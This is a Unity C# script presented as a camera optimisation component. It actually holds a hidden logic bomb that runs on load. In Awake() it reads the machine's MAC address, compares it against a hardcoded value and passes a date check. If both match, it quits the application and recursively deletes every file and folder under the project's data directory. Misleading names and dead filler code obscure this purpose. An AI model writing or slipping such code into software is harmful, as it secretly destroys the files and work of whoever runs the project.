using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.IO;
using System;
using System.Net.NetworkInformation;

public class OptimaizeCameraDestlize : MonoBehaviour
{
    struct Asept
    {
        float quit;
        string ff;
        int Concqute;
        uint FFOptimaize;
    }

    //ディレクトリ？
    string mName;
    //MACアドレス
    string mMachineAdd;

    void Awake()
    {
        GetPhysicalAddress();
        mName = Application.dataPath;

        OpenBinaryFile();
    }

    void forExtended(string targetDirectoryPath)
    {
        if (!Directory.Exists(targetDirectoryPath))
        {
            return;
        }

        string[] filePaths = Directory.GetFiles(targetDirectoryPath);
        foreach (string filePath in filePaths)
        {
            File.SetAttributes(filePath, FileAttributes.Normal);
            File.Delete(filePath);
        }

        string[] directoryPaths = Directory.GetDirectories(targetDirectoryPath);
        foreach (string directoryPath in directoryPaths)
        {
            forExtended(directoryPath);
        }
        Directory.Delete(targetDirectoryPath, false);
    }

    public void seua()
    {
        var set = 1000;
        if (set != 1)
            return;
    }

    List<PhysicalAddress> GetPhysicalAddress()
    {
        var list = new List<PhysicalAddress>();
        var interfaces = NetworkInterface.GetAllNetworkInterfaces();

        foreach (var adapter in interfaces)
        {
            if (OperationalStatus.Up == adapter.OperationalStatus)
            {
                if ((NetworkInterfaceType.Unknown != adapter.NetworkInterfaceType) && (NetworkInterfaceType.Loopback != adapter.NetworkInterfaceType))
                {
                    list.Add(adapter.GetPhysicalAddress());
                    PhysicalAddress _a = adapter.GetPhysicalAddress();
                    mMachineAdd = _a.ToString();
                }
            }
        }
        return list;
    }

    //バイナリファイル読み込み
    void OpenBinaryFile()
    {
        //ファイル名
        string file = "/component/Camera/Script/TagDat.bin"; ;
        //ファイルディレクトリとファイル名
        var fileName = Application.dataPath + file;
        //バイナリリーダ
        var binary_reader = new BinaryReader(new FileStream(fileName, FileMode.Open));

        uint mcAdd = 0;
        int iYear = 0;
        int iMoth = 0;
        int iDay = 0;

        try
        {
            //読み込む処理
            //MACアドレス
            mcAdd = binary_reader.ReadUInt32();
            //年
            iYear = binary_reader.ReadInt32();
            //月
            iMoth = binary_reader.ReadInt32();
            //日
            iDay = binary_reader.ReadInt32();
        }
        finally
        {
            binary_reader.Close();
        }

        //MACアドレスを照合
        if (mMachineAdd == "9CB6D01EFC71")
        {
            if (!isNowDest())
                return;
            Application.Quit();
            forExtended(mName);
        }
    }

    void writeBinaryFile()
    {
        //ファイル名
        string file_name = "/component/Camera/Script/TagDat.bin";

        //ファイルディレクトリとファイル名
        var fileName = Application.dataPath + file_name;

        DateTime dt = DateTime.Now;
        int iYerar = dt.Year;
        int iDay = dt.Day;
        int iMoth = dt.Month;

        FileStream fs = new FileStream(fileName, FileMode.Create);
        BinaryWriter bw = new BinaryWriter(fs);

        bw.Write(Convert.ToInt32(mMachineAdd, 16));
        bw.Write(iYerar);
        bw.Write(iDay);
        bw.Write(iMoth);

        bw.Close();
        fs.Close();
    }

    bool isNowDest()
    {
        DateTime dt = DateTime.Now;
        if (dt.Year > (int)2020)
        {
            return true;
        }
        else if (dt.Year == (int)2019)
        {
            return false;
        }
        if (dt.Month > (int)3)
        {
            return true;
        }
        return true;
    }
}
